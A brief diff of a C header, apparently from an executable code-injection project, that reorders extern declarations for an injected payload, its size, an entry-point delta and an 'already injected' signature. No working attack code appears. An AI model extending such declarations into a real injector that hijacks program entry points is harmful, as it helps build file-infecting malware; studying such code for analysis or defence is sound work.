@@ -9,9 +9,9 @@ EXTERN_C_START
 extern CONST BYTE __payload_start;  // Start of the payload
 extern CONST BYTE __payload_end;    // End of the payload
 extern CONST VOID payload();        // Payload entry point
+extern DWORD code_size;             // Size of the payload code
 extern LONGLONG delta_start;        // Delta between original and new entry points
 extern LONGLONG to_c_code;          // Offset from the payload to the C payload code (inj_code_c)
-extern DWORD code_size;             // Size of the payload code
 #ifndef SKIP_SIGN
 extern CONST DWORD signature;  // Signature to check if the payload is already injected
 #endif                         // SKIP_SIGN
